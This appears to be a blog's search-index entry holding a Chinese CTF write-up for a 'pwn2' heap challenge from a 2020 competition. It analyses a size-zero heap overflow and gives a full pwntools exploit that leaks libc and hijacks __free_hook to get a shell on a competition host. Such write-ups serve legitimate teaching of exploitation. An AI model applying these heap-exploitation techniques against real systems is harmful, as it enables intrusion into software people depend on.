<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP</title>
      <link href="1970/01/01/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/"/>
      <url>1970/01/01/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>自己只做了pwn2，就从pwn2开始</p><p>c++用于输入输出,主要逻辑是用c实现的。因为会调用c++的库，这里涉及到一些库的库的加载。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="./attachments/460f7fe9177846df879863c485e2940b.zip" alt="附件"></p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836235597.png" alt="add"></p><p>当进行add的时候如果size为0将会成功申请空间</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836644128.png" alt="edit"></p><p>在edit的时候如果size为0可以无限制的获取输入，造成了堆溢出。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>1.libc2.27需要填满tcach然后泄露libc地址。但是这里泄露出来的libc如下图，泄露出来的是第二条线的地址，实际上需要的是第一条线的地址，实际上这几部分是同一个库，相对的偏移都是固定的。</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836598126.png" alt="加载"></p><ul><li>2.用fastbin attack劫持__malloc_hook，2.27使得可以申请到任何一段空间不需要size的限制。实际上__malloc_hook劫持成one_gatget这里不行。实际用system函数劫持__free_hook</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836619586.png" alt="free_hook"></p><p>这里有一个问题：__free_hook看到的地址是在data区域,但是pwntools的symbols还是获取到了正确的偏移。</p><ul><li>3.保存点小技巧：</li></ul><pre><code>def debug(addr,PIE=True):  debug_str = &quot;&quot;  if PIE:    text_base = int(os.popen(&quot;pmap &#123;&#125;| awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid)).readlines()[1], 16)    for i in addr:      debug_str+=&#39;x /10xg &#123;&#125;\n&#39;.format(hex(text_base+i))    gdb.attach(p,debug_str)  else:    for i in addr:      debug_str+=&#39;b *&#123;&#125;\n&#39;.format(hex(text_base+i))    gdb.attach(p,debug_str)</code></pre><p>可以很方便调试开启了PIE的程序，把命令改掉可以换成下断点</p><p> Ubuntu18使用fastbin attack是直接把fd指针指向要修改的地址就好</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># _*_ coding:utf-8 _*_</span>from pwn <span class="token function">import</span> *context.log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># context.terminal=['tmux', 'splitw', '-h']</span>prog <span class="token operator">=</span> <span class="token string">'./noteplus'</span><span class="token comment" spellcheck="true"># #elf = ELF(prog)</span><span class="token comment" spellcheck="true"># # p = process(prog)#,env=&amp;#123;"LD_PRELOAD":"./libc-2.27.so"&amp;#125;)</span><span class="token comment" spellcheck="true"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span><span class="token comment" spellcheck="true"># p = remote("121.36.245.213", 23333)</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span>local<span class="token operator">=</span>1from one_gadget <span class="token function">import</span> generate_one_gadget<span class="token keyword">if</span> local:    path_to_libc <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>    one<span class="token operator">=</span><span class="token punctuation">[</span>0x4f3d5,0x4f432,0x10a41c<span class="token punctuation">]</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span>prog<span class="token punctuation">)</span>else:    one <span class="token operator">=</span> <span class="token punctuation">[</span>0x10a45c, 0x4f3c2, 0x4f365<span class="token punctuation">]</span>    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"121.36.245.213"</span>, 23333<span class="token punctuation">)</span>    path_to_libc<span class="token operator">=</span><span class="token string">"/media/tower/data/work/ctf/dianxin/pwn2/460f7fe9177846df879863c485e2940b/libc-2.27.so"</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>path_to_libc<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span>def one_gadget_list<span class="token punctuation">(</span><span class="token punctuation">)</span>:    one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> offset <span class="token keyword">in</span> generate_one_gadget<span class="token punctuation">(</span>path_to_libc<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset<span class="token punctuation">))</span>        one.append<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    <span class="token keyword">return</span> one<span class="token comment" spellcheck="true"># one=one_gadget_list()</span><span class="token comment" spellcheck="true"># p = process(["/glibc/2.27/64/lib/ld-2.27.so", "./pwn"], env=&amp;#123;"LD_PRELOAD": "/glibc/2.27/64/lib/libc.so.6"&amp;#125;)</span><span class="token comment" spellcheck="true"># p = process(["./libc-2.27.so", "./noteplus"], env=&amp;#123;"LD_PRELOAD": "./libc-2.27.so"&amp;#125;)</span>def debug<span class="token punctuation">(</span>addr,PIE<span class="token operator">=</span>True<span class="token punctuation">)</span>:  debug_str <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">if</span> PIE:    text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os.popen<span class="token punctuation">(</span><span class="token string">"pmap &amp;#123;&amp;#125;| awk '&amp;#123;&amp;#123;print <span class="token variable">$1</span>&amp;#125;&amp;#125;'"</span>.format<span class="token punctuation">(</span>p.pid<span class="token punctuation">))</span>.readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span>, 16<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr:      debug_str+<span class="token operator">=</span><span class="token string">'x /10xg &amp;#123;&amp;#125;\n'</span>.format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base+i<span class="token punctuation">))</span>    gdb.attach<span class="token punctuation">(</span>p,debug_str<span class="token punctuation">)</span>  else:    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr:      debug_str+<span class="token operator">=</span><span class="token string">'b *&amp;#123;&amp;#125;\n'</span>.format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base+i<span class="token punctuation">))</span>    gdb.attach<span class="token punctuation">(</span>p,debug_str<span class="token punctuation">)</span>def New<span class="token punctuation">(</span>index,size<span class="token punctuation">)</span>:    p.sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span>,<span class="token string">"1"</span><span class="token punctuation">)</span>    p.sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span>,index<span class="token punctuation">)</span>    p.sendlineafter<span class="token punctuation">(</span><span class="token string">"ize: "</span>,size<span class="token punctuation">)</span>def Delete<span class="token punctuation">(</span>index<span class="token punctuation">)</span>:    p.sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span>,<span class="token string">"2"</span><span class="token punctuation">)</span>    p.sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span>,index<span class="token punctuation">)</span>def Edit<span class="token punctuation">(</span>index,content<span class="token punctuation">)</span>:    p.sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span>,<span class="token string">"3"</span><span class="token punctuation">)</span>    p.sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span>,index<span class="token punctuation">)</span>    p.sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span>,content<span class="token punctuation">)</span>def View<span class="token punctuation">(</span>index<span class="token punctuation">)</span>:    p.sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span>,<span class="token string">"4"</span><span class="token punctuation">)</span>    p.sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span>,index<span class="token punctuation">)</span>index<span class="token operator">=</span>0x8<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>index<span class="token punctuation">)</span>:    New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>, str<span class="token punctuation">(</span>0x98<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>9<span class="token punctuation">)</span>, str<span class="token punctuation">(</span>0x98<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0xa<span class="token punctuation">)</span>, str<span class="token punctuation">(</span>0x98<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0xb<span class="token punctuation">)</span>, str<span class="token punctuation">(</span>0x98<span class="token punctuation">))</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>index-1<span class="token punctuation">)</span>:    Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">))</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span>9<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0xc<span class="token punctuation">)</span>, str<span class="token punctuation">(</span>0x68<span class="token punctuation">))</span>View<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0xc<span class="token punctuation">))</span>p.recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>libc_content<span class="token operator">=</span>p.recvuntil<span class="token punctuation">(</span><span class="token string">"\x0a"</span>,drop<span class="token operator">=</span>True<span class="token punctuation">)</span>.ljust<span class="token punctuation">(</span>8,<span class="token string">"\x00"</span><span class="token punctuation">)</span>libc.address<span class="token operator">=</span>u64<span class="token punctuation">(</span>libc_content<span class="token punctuation">)</span>-0xb78-0x1b8-0x3eb000print<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc.address<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0<span class="token punctuation">)</span>,str<span class="token punctuation">(</span>0<span class="token punctuation">))</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0xa<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0x1<span class="token punctuation">)</span>,str<span class="token punctuation">(</span>0x68<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0x2<span class="token punctuation">)</span>,str<span class="token punctuation">(</span>0x68<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0x3<span class="token punctuation">)</span>,str<span class="token punctuation">(</span>0x68<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0x4<span class="token punctuation">)</span>,str<span class="token punctuation">(</span>0x68<span class="token punctuation">))</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span>1<span class="token punctuation">))</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span>2<span class="token punctuation">))</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span>3<span class="token punctuation">))</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span>4<span class="token punctuation">))</span><span class="token comment" spellcheck="true"># New(str(5),str(0x68))</span><span class="token comment" spellcheck="true"># New(str(6),str(0x68))</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Delete(str(5))</span><span class="token comment" spellcheck="true"># print(hex(libc.symbols["__malloc_hook"]))</span><span class="token comment" spellcheck="true">#0x354b78</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0<span class="token punctuation">)</span>,p64<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*4+p64<span class="token punctuation">(</span>0x71<span class="token punctuation">)</span>+p64<span class="token punctuation">(</span>libc.symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>-8<span class="token punctuation">)</span>*2+<span class="token string">"\n"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc.symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token comment" spellcheck="true"># debug([0x203320])</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>1<span class="token punctuation">)</span>,str<span class="token punctuation">(</span>0x68<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>2<span class="token punctuation">)</span>,str<span class="token punctuation">(</span>0x68<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>3<span class="token punctuation">)</span>,str<span class="token punctuation">(</span>0x68<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>4<span class="token punctuation">)</span>,str<span class="token punctuation">(</span>0x68<span class="token punctuation">))</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,str<span class="token punctuation">(</span>0x68<span class="token punctuation">))</span><span class="token comment" spellcheck="true"># print(hex(libc.sym["realloc"]))</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,p64<span class="token punctuation">(</span>libc.symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>+<span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p64(libc.symbols["__malloc_hook"]-0x3eb000-8+13)+"\n")</span><span class="token comment" spellcheck="true"># New(str(6),str(0x68))</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span>0<span class="token punctuation">)</span>,<span class="token string">"a"</span>*32+p64<span class="token punctuation">(</span>0x71<span class="token punctuation">)</span>+<span class="token string">"/bin/sh\x00\n"</span><span class="token punctuation">)</span>debug<span class="token punctuation">(</span><span class="token punctuation">[</span>0x203320<span class="token punctuation">]</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span>4<span class="token punctuation">))</span>p.interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p><img src="./attachments/fa0496f2857c40c3a0082ca16f3c1894.zip" alt="附件"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf , wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
